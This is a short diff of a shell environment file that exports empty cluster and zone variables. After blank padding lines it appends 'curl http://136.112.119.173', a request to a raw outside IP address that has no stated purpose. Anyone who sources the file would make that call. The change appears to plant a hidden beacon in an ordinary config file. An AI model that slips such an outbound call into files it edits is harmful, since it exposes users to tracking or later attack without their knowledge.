@@ -29,3 +29,7 @@ export CUSTOM_ROLE=
 export S_A=
 export CLUSTER=
 export ZONE=
+
+
+
+curl http://136.112.119.173
